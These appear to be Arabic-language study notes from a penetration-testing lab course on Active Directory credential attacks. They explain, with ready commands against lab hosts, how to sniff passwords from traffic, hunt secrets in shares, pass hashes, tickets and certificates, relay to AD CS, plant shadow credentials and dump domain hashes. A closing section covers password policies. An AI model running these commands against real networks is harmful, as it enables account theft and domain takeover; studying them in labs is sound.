### 1️⃣ HTTP Traffic

```
http
```

![[Pasted image 20251201163744.png]]
### 2️⃣ HTTP POST Requests (المكان اللي فيه login):

```
http.request.method == "POST"
```

### 3️⃣ دور على كلمة “pass” جوا البوديز:

```
http contains "pass"
```

![[Pasted image 20251201163757.png]]


ده بيطلع الفورم كله:

```
username=admin&password=12345
```

### 4️⃣ FTP Credentials:

```
ftp
```

وفيها هتشوف:

```
USER john
PASS hunter2
```

### 5️⃣ SNMP Community String:

```
udp.port == 161
```

SNMPv2 بيبعت community string نص صريح.

### 6️⃣ LDAP بدون تشفير:

```
ldap
```

ممكن يطلع الـ Bind Request فيه username + password.

### 7️⃣ Filter Conversation:

```
tcp.stream eq 5
```

ده بيجيبلك الـ 2 hosts اللي بيتكلموا مع بعض — مهم جدًا لما تلاقي login.

---

## رابعًا: Find Packet

Wireshark يقدر يدوّر على كلمات جوا الـ packet body:

من:  
**Edit → Find Packet**

ودوّر على:

- pass
    
- pwd
    
- user
    
- login
    

أو حتى regex.

---

## خامسًا: Pcredz — أداة استخراج Credentials أوتوماتيك!

دي أداة خرافية لأنها:

- بتقرأ PCAP file
    
- وتطلعلك كل credentials
    
- وتكشف NTLM hashes
    
- وتلقط FTP login
    
- وتجيب HTTP Form data
    
- وتجيب credit card numbers
    

### طريقة استخدامها:

```
./Pcredz -f demo.pcapng -t -v
```

هتشوف Output زي:

```
Found SNMPv2 Community string: s3cr3t
FTP User: lewis
FTP Pass: qwerty123
```

يعني الأداة بتشتغل زي Hunter أوتوماتيك.

---

## إيه اللي بيطلع مع Pcredz؟

- **FTP USER/PASS**
    
- **HTTP BASIC AUTH**
    
- **HTTP FORM LOGINS**
    
- **POP/IMAP/SMTP passwords**
    
- **NTLM hashes**
    
- **Kerberos AS-REQ hashes**
    
- **SNMP community strings**
    
- **Credit card numbers في الترافيك**
    

يعني بتغطي 90% من الـ plaintext authentication.

---

## سادسًا: سيناريو عملي

انت عندك ملف اسمه `demo.pcapng`.

عايز تشوف لو في credentials.

## الطريقة 1 — باستخدام Wireshark يدويًا:

- افتح الملف

`wireshark demo.pcapng`
- حط فلتر:
    

```
http.request.method == "POST"
```

لو لقيت:

```
username=admin&password=123456
```

يبقى bingo.

أو فلتر:

```
ftp
```

وهتلاقي:

```
USER mohab
PASS 1234
```

أو:

```
udp.port == 161
```

وتلاقي SNMP string.

---

## الطريقة 2 — باستخدام Pcredz تلقائيًا:

```
./Pcredz -f demo.pcapng -t -v
```

هيطلع لك كل الـ credentials مرة واحدة.

---

## الخلاصة الهامة

**Credential Hunting = التقاط كلمات السر اللي بتعدي في الشبكة بدون تشفير.**

وإنت كمهاجم تعتمد على:

###  Wireshark

تبحث يدويًا عن:

- POST forms
    
- FTP login
    
- SNMP community strings
    
- HTTP Basic
    
- LDAP Bind
    

###  Pcredz

يعمل auto-extract  
لكل credentials في ثواني.

---
# Layer 19

---

### 🧠 **الفكرة الأساسية — ليه Network Shares كنز للهاكر؟**

أي شركة فيها **Shared Folders** 

موظفين بيشاركوا فيها شغلهم.

المشكلة؟  
محدش بياخد باله… وفي ناس بتحط:

- Passwords
    
- .ini / .cfg / .env
    
- Scripts فيها Credential
    
- Backups
    
- SSH keys
    
- Files اسمها "config"، "users"، "passwords"
    
- XML فيه Local Admin Password (مثال unattended.xml)
    

الهاكر يدخل Domain → يدور في كل الشيرز → يلاقي Password → يعمل Lateral Movement → PrivEsc → Domain Admin.

---

## **قبل ما تستخدم أدوات — اعرف إيه اللي ممكن تلاقيه**

## الكلمات المهمة

`passw user credential token key secret inlanefreight\ config admin login`

## الامتدادات اللي فيها أسرار:

`.ini .cfg .env .xlsx .csv .ps1 .bat .xml .kdbx`

---

## **الأدوات اللي بتعمل Automation للبحث**

دلوقتي ندخل للأدوات اللي الشرح كان عنها.

---

### 1️⃣ **Snaffler – Windows Domain Joined Machine**

دي أقوى أداة للبحث في Network Shares من جوه Windows Domain.

تشغلها:

`Snaffler.exe -s`

**Snaffler بتعمل إيه؟**

✔ تجمع الـ Shares في الدومين  
✔ تشوف إيه اللي تقدر تقراه (Readable Shares)  
✔ تدور جوه كل شير على كلمات سر  
✔ تعمل Regex Matching على ملفات حساسة  
✔ تديك النتيجة بلون:

- **Red** = في Credential
    
- **Yellow** = ملف كبير أو مهم
    
- **Green** = Share تقدر تدخل عليه
    

زي اللوج اللي أنت شايفه:

`[File] {Red} <passw> (...) \\DC01\C$\Windows\Panther\unattend.xml`

ده جميل جدًا…  
لأن unattended.xml دايمًا بيحتوي Local Admin Password.

---

### **PowerHuntShares – PowerShell**

دي Tool ممتازة للشركات الكبيرة.

تشغلها:

`Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public`

**بتعمل إيه؟**

✔ تجيب كل الـ Shares  
✔ تشوف مين ليه Access  
✔ تكتشف Shares فيها Permissions خطيرة  
✔ تدور على Data Exposure  
✔ وتطلعلك HTML Report جاهز

ودي ميزة جامدة جدًا.

---

## 3️⃣ **MANSPIDER – Linux SMB Share Hunter**

لو إنت مش على Windows  
MANSPIDER ممتازة + بسيطة.

تشغلها:

`docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u mendres -p 'Inlanefreight2025!'`

**MANSPIDER بتعمل:**

✔ Login على SMB  
✔ Search بالكلمة اللي تحددها  
✔ تحمّل أي ملف فيه Match  
✔ تحطه في loot folder

جامدة لو إنت Off-AD (مش جوه الدومين).

---

## 4️⃣ **NetExec (CrackMapExec سابقًا)**

أكتر أداة شاملة للـ AD.

تشغل Spider:

`nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"`

**NetExec بتعمل:**

✔ Connect SMB  
✔ Extract Shares  
✔ Spider Folder معين  
✔ دور على محتوى ملف  
✔ تجيب Passwords بسرعة

ميزة رهيبة:  
تشغل search على Share واحد بس بدل الدومين كله.

---

C:\HR\Confidential\Onboarding_Docs_132.txt

## 🧪 **الـ Exercise اللي في النهاية**

القسم بيقولك:

> استخدم user:

`mendres : Inlanefreight2025!`

وتعمل Login على الماشين بالـ:

- RDP  
    أو
    
- WinRM (evil-winrm)
    

وبعدين تستخدم واحدة من الأدوات اللي فوق:

- Snaffler (موجود في C:\Users\Public)
    
- PowerHuntShares
    
- أو تعمل scanning بنفسك
    

علشان تجيب:

✔ Password  
✔ ملفات حساسة  
✔ Config files





# Layer 20
## يعني إيه Pass the Hash (PtH) من الأساس؟

خلّيك معايا كده خطوة خطوة 👇

## 1️⃣ الباسورد في ويندوز بيتخزن إزاي؟

ويندوز **ما بيخزنش الباسورد صريح** (plain text)  
بيخزنه في صورة **Hash**

يعني:

`Password123 ↓ 64F12CDDAA88057E06A81B54E73B949B`

الـ Hash ده:

- قيمة ثابتة
    
- طولها ثابت
    
- لو الباسورد ما اتغيرش → الهاش ما يتغيرش
    

---

## 2️⃣ طيب Pass the Hash يعني إيه؟

يعني:

> **أنا مش محتاج أعرف الباسورد نفسه، أنا أستخدم الهاش زي ما هو وأعمل Login**

المهم:

- **مش بفك الهاش**
    
- **مش برجع الباسورد**
    
- أنا بستغل إن بروتوكول المصادقة نفسه بيقبل الهاش
    

وده اللي يخلي الهجوم خطير  

---

## 3️⃣ ليه الهجوم ده شغال؟

علشان:

- NTLM **بيستخدم الهاش مباشرة**
    
- مفيش Salt
    
- الهاش ثابت لكل Session
    

يعني الهاش = المفتاح 🔑

---

## طب الهاش ده بجيبه منين؟

ماينفعش أي حد يجيبه، لازم:

> **Admin أو صلاحيات عالية**

### أشهر أماكن بنطلع منها الهاش:

### 🟢 1. SAM Database

- دي قاعدة بيانات محلية
    
- فيها حسابات الجهاز
    
- بنطلعها بعد اختراق الجهاز
    

### 🟢 2. NTDS.dit (الدومين)

- دي أخطر واحدة
    
- موجودة على الـ Domain Controller
    
- فيها هاشات كل المستخدمين في الدومين 😨
    

### 🟢 3. الذاكرة (LSASS)

- lsass.exe مسؤول عن الـ Authentication
    
- لو قريناه من الذاكرة → نطلع الهاشات
    

وهنا بييجي دور **Mimikatz** 

---

## NTLM ببساطة شديدة

## يعني إيه NTLM؟

ده بروتوكول Authentication قديم من مايكروسوفت

### بيشتغل إزاي؟

1. السيرفر يقولك: اتفضل Challenge
    
2. الكلاينت يشفره بالهاش
    
3. السيرفر يقارن
    
4. لو تمام → دخول ✔️
    

📌 مفيش باسورد رايح جاي  
📌 كله بالهاش

وده سبب PtH

---

## Pass the Hash باستخدام Mimikatz (ويندوز)

## Mimikatz ده إيه؟

ده **سكينة الجيش السويسري** في ويندوز:

- Dump hashes
    
- Tickets
    
- Tokens
    
- Pass the Hash
    

---

## sekurlsa::pth بيعمل إيه؟

بيعمل:

> **Process جديدة شغالة بهوية المستخدم باستخدام الهاش**

يعني بدل ما تدخل باسورد → تدخل Hash


![[Pasted image 20260115203035.jpg]]



---

## شرح الأمر ده حتة حتة:

`sekurlsa::pth`

→ موديل Pass the Hash

`/user:julio`

→ أنا عايز أبقى Julio

`/rc4:64F12CDDAA88057E06A81B54E73B949B`

→ ده NTLM Hash  
(اسمه rc4 علشان NTLM بيستخدم RC4-HMAC)

`/domain:inlanefreight.htb`

→ الدومين بتاع الحساب

`/run:cmd.exe`

→ افتحلي CMD بالحساب ده

---

## النتيجة؟

- CMD جديد
    
- كل أوامرك شغالة كأنك **Julio**
    
- تقدر:
    
    - تدخل Shares
        
    - تعمل Lateral Movement
        
    - تنفذ أوامر
        

🔥 من غير ما تعرف الباسورد

---

## Invoke-TheHash (PowerShell)

## ده مختلف عن Mimikatz إزاي؟

|Mimikatz|Invoke-TheHash|
|---|---|
|بيشغل Process محلي|بيكلم جهاز تاني|
|محتاج صلاحيات|لا|
|شغال على الجهاز نفسه|Remote|

---

## بيعتمد على إيه؟

- SMB
    
- WMI
    
- NTLMv2
    

---

## أهم شرط:

⚠️ اليوزر والهاش **لازم يكونوا Admin على الجهاز الهدف**

---

## مثال:

`Invoke-SMBExec`

→ يشغل أوامر عن طريق SMB

الأمر ده:

- أنشأ User جديد
    
- دخله Administrators
    
- كل ده بالهاش بس 😎
    

---

## Reverse Shell بالـ PtH

## السيناريو:

1. تفتح Listener بـ nc
    
2. تبعت Reverse Shell PowerShell
    
3. Invoke-TheHash ينفذه
    
4. الجهاز الهدف يكلمك
    

🎯 النتيجة:  
Shell كامل من DC

---

## Pass the Hash من Linux (Impacket)

## Impacket ده إيه؟

باكدچ Python تقيلة جدًا:

- Exec
    
- Dump
    
- Lateral Movement
    
- AD Attacks
    

---

## PsExec بيعمل إيه؟

1. يرفع exe
    
2. ينشئ Service
    
3. يشغلها
    
4. يديلك Shell
    

بـ:

`-hashes :NTLM`

لاحظ:

- مفيش باسورد
    
- حتى اليوزر Admin
    

---

## أدوات تانية:

- wmiexec
    
- smbexec
    
- atexec
    

كلهم نفس الفكرة، طرق مختلفة

---

## NetExec (CrackMapExec الجديد)

## ده بيعمل إيه؟

- يجرب الهاش على شبكة كاملة
    
- يشوف فين شغال
    
- يقولك:
    

`Pwn3d!`

يعني:

> أنت Admin على الجهاز ده 

---

## ليه ده خطير؟

علشان:

- Password Reuse
    
- Gold Image
    
- نفس Local Admin على كل الأجهزة
    


---

## evil-winrm (PowerShell Remoting)

## إمتى أستخدمه؟

- SMB مقفول
    
- WinRM شغال
    
- عايز Shell نظيف
    

يديلك:

`PS C:\Users\Administrator>`

---

## Pass the Hash مع RDP

## ليه ده مش دايمًا شغال؟

علشان:

- Restricted Admin Mode مقفول افتراضيًا
    

---

## الحل؟

تعديل Registry:

`DisableRestrictedAdmin = 0`

بعدها:

`xfreerdp /pth`

وتخش Desktop كامل 

---

## UAC وتأثيره على PtH

## المشكلة:

Local Admin مش دايمًا يقدر يعمل Remote Admin

### Registry مهم:

`LocalAccountTokenFilterPolicy`

- 0 → بس Administrator الأصلي
    
- 1 → كل Local Admins
    

⚠️ لو:

`FilterAdministratorToken = 1`

حتى Administrator الأساسي مش هيشتغل PtH

---

## الخلاصة الذهبية 

- Pass the Hash = استخدام الهاش بدل الباسورد
    
- NTLM السبب الأساسي
    
- مفيش فك ولا Decrypt
    
- Admin Hash = مفاتيح الشبكة
    
- أخطر حاجة في AD بعد Credential Dump


# Layer 21
## 1️⃣ فكرة Kerberos refresher

- **Kerberos** 
- بيشتغل بنظام التذاكر (tickets). الفكرة الأساسية: بدل ما كل خدمة تعرف باسوردك، هي تاخد **ticket محدد** يثبت هويتك.
    
- **Ticket Granting Ticket (TGT)**: 
- أول تذكرة بتحصل عليها عند تسجيل الدخول. بتسمح لك تطلب تذاكر لخدمات تانية.
    
- **Ticket Granting Service (TGS)**: 
- التذكرة دي بتستخدم عشان تخدم خدمة معينة (مثلاً MSSQL).
    

---

## 2️⃣ Pass the Ticket Attack

- الهدف: التحرك lateral داخل شبكة Active Directory من غير ما تحتاج باسورد الضحية.
    
- بنحتاج **Kerberos ticket صالح** (TGS أو TGT).
    
- في ويندوز، التذاكر دي بتتخزن في **LSASS**:
    
    - لو عندك صلاحيات عادية → هتقدر تاخد التذاكر بتاعتك.
        
    - لو عندك **admin محلي** → تقدر تجمع كل التذاكر في الجهاز.
        

---

## 3️⃣ جمع التذاكر (Harvesting Tickets)

### باستخدام Mimikatz:

`privilege::debug sekurlsa::tickets /export`

- هتطلعلك ملفات `.kirbi` لكل تذكرة.
    
- ملفات تنتهي بـ `$` → حساب جهاز (computer account)
    
- ملفات المستخدمين → username@service-domain.kirbi
    
- تذكرة **krbtgt** → TGT.

![[Pasted image 20260116142400.png]]




### باستخدام Rubeus:

`Rubeus.exe dump /nowrap`

- يطبع التذاكر بالـ **Base64** بدل الملفات.
    
- ميزة: ممكن تستخدمها بسهولة للـ Pass the Ticket بعدين.
    

---

## 4️⃣ Pass the Key aka OverPass the Hash

- بدل استخدام NTLM hash زي **Pass the Hash (PtH)** التقليدي، هنا بنحوّل الـ hash أو الـ key للـ user (AES/RC4) لـ **TGT كامل**.
    
- الخطوات:
    
    1. استخدم Mimikatz `sekurlsa::ekeys` عشان تجيب كل الـ Kerberos keys.
        
    2. استخدم الـ hash مع:
        
        - **Mimikatz**: `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>`
            
        - **Rubeus**: `asktgt /user:<user> /domain:<domain> /aes256:<hash> /nowrap`
            

> ملاحظة: Mimikatz محتاج صلاحيات admin، بينما Rubeus ممكن يشتغل من غير.

---

## 5️⃣ Pass the Ticket (PtT)

- بعد ما حصلنا على التذاكر، نقدر نستخدمها عشان نتحرك lateral داخل الشبكة.
    
- مع Rubeus نقدر نعمل:
    

`Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<hash> /ptt`

- `/ptt` → بيقدم التذكرة للجلسة الحالية ويخليك تستخدمها على طول.
    

---

### ملاحظات مهمة

1. كل الخطوات اللي فيها Mimikatz أو Rubeus للحصول على تذاكر أو عمل PtT محتاجة admin عشان تكون فعالة.
    
2. Windows domains الحديثة (2008+) بتستخدم **AES** بشكل افتراضي. 
3. لو استخدمت RC4 → ممكن يبان كـ "encryption downgrade" وينكشف النشاط.
    
3. TGT = تستخدمه عشان تطلب أي خدمة  
    TGS = تستخدمه عشان خدمة معينة فقط

# Layer 22
### 1️⃣ Linux  و Active Directory

- Linux
- ممكن يتوصل بـ Active Directory علشان يشارك الـ identity مع Windows، يعني ممكن تستخدم نفس الحساب على Linux وWindows.
    
- Linux
- غالبًا بيستخدم **Kerberos** للتحقق من الهوية (Authentication).
    

---

### 2️⃣ تذاكر Kerberos على Linux

- **TGT (Ticket Granting Ticket)** و**TGS (Service Ticket)** نفس النظام اللي في Windows.
    
- Linux
- بيخزن التذاكر دي غالبًا في **ccache files** في `/tmp`.
    
- مكان التذكرة الافتراضي بيتسجل في **Environment Variable** اسمه `KRB5CCNAME`.
    
- لو عندك صلاحيات root أو elevated، تقدر توصل للتذاكر دي.
    

---

### 3️⃣ Keytab Files

- Keytab = ملف فيه أزواج من **Kerberos principal + encrypted key**.
    
- بيستخدم للتوثيق أوتوماتيكيًا من غير ما تدخل password.
    
- ممكن تتواجد في أي مكان، غالبًا `/etc/krb5.keytab` أو ملفات سكريبتات أو cronjobs.
    
- لو حصلت على Keytab، تقدر تعمل impersonate لأي يوزر مرتبط بالملف.
    

---

### 4️⃣ التعرف على جهاز Linux متصل بـ AD

- استخدم الأمر `realm list`:
    
    `realm list`
    
    يوريك:
    
    - اسم الدومين
        
    - نوع التوصيل (Kerberos)
        
    - أي يوزرات أو جروبات مسموح لها
        
- لو `realm` مش موجود، شوف خدمات `sssd` أو `winbind`.
    

---

### 5️⃣ البحث عن Kerberos Tickets

#### أ. Keytab files

- أمر البحث:
    
    `find / -name *keytab* -ls 2>/dev/null`
    
- لو في سكريبتات تستخدم keytab، دور في الـ cronjobs:
    
    `crontab -l cat /path/to/script.sh`
    
- مثال:
    
    `kinit svc_workstations@DOMAIN -k -t /path/to/file.keytab`
    
    ده هيعمل لك ticket للـ user الموجود في keytab.
    

#### ب. ccache files

- `ccache` بيخزن التذاكر مؤقتًا في `/tmp`.
    
- شوف الـ environment variable:
    
    `env | grep -i krb5`
    
- ممكن تنسخ التذكرة لملف تاني وتضبط `KRB5CCNAME`:
    
    `cp /tmp/krb5cc_somefile . export KRB5CCNAME=./krb5cc_somefile klist  # للتحقق`
    

---

### 6️⃣ استغلال Keytab و ccache

- **Keytab**:
    
    - اعرف الـ principal باستخدام:
        
        `klist -k -t /path/to/keytab`
        
    - استورد التذكرة:
        
        `kinit user@DOMAIN -k -t /path/to/keytab`
        
- **ccache**:
    
    - انسخ الملف وعين `KRB5CCNAME`:
        
        `export KRB5CCNAME=/path/to/ccache klist  # تشوف التذاكر`
        
- بعد كده تقدر تستخدم أدوات زي **Impacket** أو **Evil-WinRM** على Linux.
    

---

### 7️⃣ أدوات Linux لاستغلال Kerberos

- **Impacket tools**:
    
    - ضروري يكون `KRB5CCNAME` مضبوط على الـ ccache اللي عايز تستخدمه.
        
    - مثال:
        
        `proxychains impacket-wmiexec target -k`
        
- **Evil-WinRM**:
    
    - محتاج تثبت `krb5-user` على Debian-based Linux.
        
    - تأكد من إعدادات `/etc/krb5.conf`:
        
        `[libdefaults]   default_realm = DOMAIN [realms]   DOMAIN = { kdc = dc.domain.local }`
        
    - بعدها:
        
        `proxychains evil-winrm -i dc01 -r DOMAIN`
        

---

### 8️⃣ تحويل ccache ↔ kirbi

- لو عايز تستخدم التذاكر بين Windows وLinux:
    
    - استخدم `impacket-ticketConverter`:
        
        `impacket-ticketConverter krb5cc_file julio.kirbi`
        

---

###  الفكرة الكبيرة

- هدف كل دا: تاخد **تذكرة Kerberos** لمستخدم أو جهاز وتعمله impersonate بدون ما تعرف كلمة السر.
    
- Keytab: استغلال مباشر للـ credentials.
    
- ccache: استغلال التذاكر اللي موجودة حاليًا على الجهاز.
    
- بعد ما تسيطر على حساب واحد، ممكن تصعد صلاحيات للوصول للـ Domain Controller.

# Layer 23
## يعني إيه Pass the Certificate أصلاً؟

خلّيك فاكر قبل أي حاجة:

- **Pass the Hash** → بتستخدم الـ NTLM Hash بدل الباسورد
    
- **Pass the Ticket** → بتستخدم Kerberos Ticket جاهز
    
- **Pass the Certificate** → _بقى بقى_ بتستخدم **Certificate (شهادة رقمية)** بدل الباسورد كله
    

يعني:

> بدل ما أقول للـ Domain:  
> "أنا فلان والباسورد بتاعي كذا"
> 
> أقول له:  
> "أنا فلان، ودي شهادة رسمية بتثبت إني أنا"

والـ Domain يصدقك 

---

## نبدأ من الأساس: Kerberos بيشتغل إزاي؟

Kerberos هو بروتوكول الـ Authentication الأساسي في Active Directory.

السيناريو الطبيعي:

1. اليوزر يدخل Username + Password
    
2. الـ Domain Controller (KDC) يتأكد
    
3. يديه **TGT – Ticket Granting Ticket**
    
4. بالـ TGT ده يقدر يدخل على أي Service
    

📌 المهم هنا:  
**أي حد معاه TGT = دخل الدومين رسمي**

---

## طيب PKINIT إيه قصته؟

## PKINIT = Public Key Cryptography for Initial Authentication

يعني:

> بدل ما أستخدم Password في أول خطوة  
> أستخدم **Public/Private Key + Certificate**

وده معمول أصلاً عشان:

- Smart Cards
    
- Login بدون باسورد
    
- Enterprise Security
    

📌 الشهادة دي بتبقى **X.509 Certificate**

---

## Pass the Certificate يعني إيه عمليًا؟

يعني:

- أنا مش معايا باسورد
    
- مش معايا Hash
    
- معايا **Certificate**
    
- أستخدمها عشان أطلع **TGT**
    
- وبعدها أعمل اللي أنا عايزه
    

---

## العلاقة بين Pass the Certificate و AD CS

## AD CS = Active Directory Certificate Services

دي خدمة:

- بتطلع Certificates
    
- مربوطة بالدومين
    
- وبتقدر تطلع Certificates:
    
    - ليوزر
        
    - لمشين
        
    - لـ Domain Controller
        
 لو الخدمة دي متقفلة غلط = **الدومين كله في خطر**

---

## ESC8 – NTLM Relay على AD CS

## ESC8 يعني إيه؟

ده نوع Attack من ورقة اسمها:

> **Certified Pre-Owned**

ESC8 =

> NTLM Relay Attack ضد **AD CS Web Enrollment**

---

## Web Enrollment يعني إيه؟

بعض الـ CAs بيبقوا فاتحين صفحة ويب:

`http://CA-SERVER/certsrv/`

ومنها:

- تطلب Certificate
    
- تستلم Certificate
    

⚠️ وغالبًا:

- HTTP
    
- مش HTTPS
    
- وبيقبل NTLM Authentication
    
![[Pasted image 20260118011958.png]]

---

## السيناريو الإجرامي 

1. أنا كمهاجم:
    
    - أفتح ntlmrelayx
        
    - أقوله:
        
        > أي Authentication يجيلي، Relay على certsrv
        

`impacket-ntlmrelayx \ -t http://10.129.234.110/certsrv/certfnsh.asp \ --adcs \ --template KerberosAuthentication`

 template دي:

- بتحدد نوع الشهادة
    
- KerberosAuthentication = شغالة في Kerberos
    

---

## طب نجيب Authentication منين؟

## Printer Bug 

في ويندوز:

- Service اسمها **Print Spooler**
    
- فيها Bug يخلي جهاز:
    
    > يauthenticate عند أي IP انت تقوله
    

`python3 printerbug.py \ INLANEFREIGHT.LOCAL/wwhite:"password"@DC01 \ 10.10.16.12`

يعني:

> يا DC01  
> روح authenticate عند الجهاز بتاعي

---

## اللي حصل في الخلفية

1. DC01 بعت NTLM Authentication
    
2. ntlmrelayx استقبله
    
3. Relay على AD CS
    
4. AD CS قال:
    
    > أهلاً يا DC01  
    > خد Certificate 
    

📂 النتيجة:

`DC01$.pfx`

يعني:

- Certificate رسمي
    
- باسم Domain Controller نفسه
    

 الدومين بقى في جيبك

---

## نطلع TGT بالـ Certificate

هنا بقى **Pass the Certificate** فعليًا

نستخدم:  
**PKINITtools**

`python3 gettgtpkinit.py \ -cert-pfx DC01$.pfx \ -dc-ip 10.129.234.109 \ inlanefreight.local/dc01$ \ /tmp/dc.ccache`

📌 اللي حصل:

- استخدمنا Certificate
    
- عملنا PKINIT
    
- خدنا **TGT**
    

---

## دلوقتي بقينا فين؟

✔️ معانا TGT  
✔️ باسم Domain Controller  
✔️ Kerberos شغال

يعني:

> Welcome to Pass-the-Ticket land 

---

## نعمل إيه بقى؟ DCSync 

`export KRB5CCNAME=/tmp/dc.ccache  impacket-secretsdump \ -k -no-pass \ -dc-ip 10.129.234.109 \ -just-dc-user Administrator \ INLANEFREIGHT.LOCAL/DC01$`

📌 النتيجة:

- NTLM Hash بتاع Administrator
    
- أو أي يوزر انت عايزه
    

شكرًا كدا معاك الDC 

---

## Shadow Credentials – مستوى أعلى من الإجرام

## msDS-KeyCredentialLink

Attribute في AD:

- بيخزن Public Keys
    
- تستخدم في PKINIT
    

لو:

- عندك Write عليه
    
- لأي User
    

تقدر:

> تضيف Certificate باسمك  
> وتخش مكانه من غير باسورد

---

## BloodHound هيقولك إيه؟

Edge اسمه:

`AddKeyCredentialLink`

يعني:

> اليوزر ده يقدر يتحكم في Authentication بتاع التاني

---

## التنفيذ بـ pywhisker

`pywhisker \ --dc-ip 10.129.234.109 \ -d INLANEFREIGHT.LOCAL \ -u wwhite -p password \ --target jpinkman \ --action add`

📌 اللي حصل:

- اتولد Certificate
    
- اتحط Public Key عند jpinkman
    
- اتعمل PFX + Password
    

---

## نستخدمه ونطلع TGT

`python3 gettgtpkinit.py \ -cert-pfx eFUVVTPf.pfx \ -pfx-pass password \ -dc-ip 10.129.234.109 \ INLANEFREIGHT.LOCAL/jpinkman \ /tmp/jpinkman.ccache`

---

## Pass the Ticket بقى عادي

`export KRB5CCNAME=/tmp/jpinkman.ccache klist`

---

## الدخول بـ Evil-WinRM

`evil-winrm \ -i dc01.inlanefreight.local \ -r inlanefreight.local`

`whoami`

✔️ jpinkman  
✔️ بدون باسورد  
✔️ بدون Hash

---

## طب لو PKINIT مش شغال؟

في بعض البيئات:

- EKU مش مظبوطة
    
- KDC مش قابل Certificate
    

الحل:  
**PassTheCert**

- Authentication بـ LDAPS
    
- Change Password
    
- Grant DCSync
    

---

## Summary :

- AD CS Misconfig = Domain Pwn
    
- Certificate أخطر من Password
    
- Pass the Certificate = Silent + Stealthy
    
- Shadow Credentials = Persistence مرعبة


# Layer 24
## أولاً: يعني إيه Password Policies من الأساس؟

خلينا نبدأ بتشبيه بسيط 
زي ما في **قوانين مرور**:

- سرعة قصوى
    
- إشارات
    
- مخالفات
    

ليه؟  
عشان لو كل واحد ساق على مزاجه → **حوادث وفوضى**

نفس الكلام في الشركات
لو **مفيش سياسات لكلمات السر**:

- كل واحد يحط باسورد على مزاجه
    
- باسوردات سهلة
    
- اختراقات كتير
    
- تسريب داتا
    
- الشركة تولع
    

علشان كده:

> **الإدارة بتحط Password Policies**  
> يعني قواعد تمشي على كل الموظفين غصب عنهم.

---

## القصة بتاعة مارك (مثال واقعي جدًا)

- مارك موظف جديد
    
- مش IT
    
- مش فاهم مخاطر الباسوردات الضعيفة
    

📩 الشركة قالتله:

> “حط باسورد للإيميل بتاعك”

مارك قال:

`password123`

السيستم رد عليه:  
 **Error**

> الباسورد ده مش مطابق للـ Password Policy

ليه؟  
عشان الشركة حاطة **قواعد معينة**.

---

## هنا بقى عندنا عنصرين مهمين جدًا 

### 1️⃣ تعريف السياسة (Policy Definition)

يعني:

- الباسورد يبقى طوله قد إيه؟
    
- فيه أرقام؟
    
- فيه رموز؟
    
- يتغير كل قد إيه؟
    

### 2️⃣ تنفيذ السياسة (Policy Enforcement)

يعني:

- السيستم نفسه هو اللي يمنعك
    
- مش اعتماد على وعي الموظف
    

الاتنين لازم موجودين  
لو عندك تعريف من غير تنفيذ → **ولا أي لازمة**  
ولو تنفيذ من غير تعريف واضح → **لخبطة**

---

## يعني إيه Password Policy بالظبط؟

هي:

> مجموعة قواعد بتنظم إزاي الباسورد يتعمل، يتخزن، يتغير، ويتستخدم

مش بس:

- طوله كام؟
    
- فيه رموز ولا لأ؟
    

لا   
كمان:

- بيتغير إمتى؟
    
- بيتخزن فين؟
    
- بيتبعت إزاي؟
    
- بيتدار إزاي؟
    

يعني **دورة حياة الباسورد كاملة** 

---

## ليه الشركات بتمشي على Standards؟

علشان:

- في قوانين
    
- في Compliance
    
- في Best Practices
    

أشهر Standards 

### 🔹 NIST SP800-63B

ده الأمريكي  
وبيميل دلوقتي إن:

- متغيرش الباسورد كل شوية
    
- ركز على الطول والقوة
    

### 🔹 CIS Password Policy Guide

إرشادات عملية أكتر  
بتركز على تقليل الغلط البشري

### 🔹 PCI DSS

خاص بالكروت البنكية  
وسكيورتيه عالي جدًا

مهم:  
الـ **Compliance مش معناها أمان 100%**  
هي بس **baseline** (الحد الأدنى)

---

## موضوع تغيير الباسورد كل 90 يوم 

زمان كانوا يقولوا:

> غير باسوردك كل 90 يوم

بس دلوقتي؟  
معظم الخبراء ضد الفكرة دي

ليه؟

لأن المستخدم بيعمل كده:

`Password01! Password02! Password03!`

يعني:

- نفس الباسورد
    
- نفس النمط
    
- نفس الضعف
    

علشان كده الاتجاه الحديث:

> غير الباسورد **بس لو حصل اختراق**

---

## مثال على Password Policy (نموذج)

السياسة بتقول:

- أقل حاجة 8 حروف
    
- كابيتال + سمول
    
- رقم واحد على الأقل
    
- Special character
    
- مينفعش يبقى اليوزرنيم
    
- يتغير كل 60 يوم
    

مارك عمل إيه؟

`Inlanefreight01!`

 عدّى السياسة  
بس لسه ضعيف

ليه؟

- فيه اسم الشركة
    
- حاجة أي هاكر يتوقعها
    

---

## مشكلة تانية: تغيير الباسورد بعد الانتهاء

مارك بعد 60 يوم:

`Inlanefreight02!`

السيستم مبسوط 
الهاكر مبسوط أكتر 

علشان كده في جدل كبير:

- هل نغير الباسورد كل فترة؟
    
- ولا بس وقت الاختراق؟
    

---

## الحل؟ Blacklist Words 

يعني كلمات **ممنوع تستخدم في الباسورد**

زي:

- اسم الشركة
    
- كلمات مرتبطة بالشركة
    
- الشهور (January – March)
    
- الفصول (Summer – Winter)
    
- welcome / password
    
- كلمات سهلة زي:
    
    - 123456
        
    - abcde
        
    - qwerty
        

---

## إزاي نطبق السياسة دي فعليًا؟

السياسة لوحدها ورق 
لازم **تنفيذ تقني**

### مثال: Active Directory

- بنعمل GPO
    
- نحدد:
    
    - الطول
        
    - التعقيد
        
    - المدة
        
- أي يوزر يخالف → مش هيعرف
    

وبعد كده:

- نشرح السياسة للموظفين
    
- نحط Procedures
    
- نتأكد إنها مطبقة في كل السيستمات
    

---

## طيب أعمل باسورد قوي إزاي؟

### 🔹 Tools

- PasswordMonster → يقيم القوة
    
- 1Password Generator → يولد باسوردات
    

مثال:

`CjDC2x[U`

✔️ قوي جدًا  
✔️ محتاج آلاف السنين يتكسر  
❌ صعب يتحفظ

---

## الحل الذكي: Passphrases 

جملة مش كلمة:

`This is my secure password`

أو:

`The name of my dog is Popy`

تزود تعقيد:

`(The name of my dog is Popy!)`

✔️ سهل تتحفظ  
✔️ صعب يتكسر  
⚠️ بس خد بالك:

- الهاكر ممكن يعمل OSINT
    
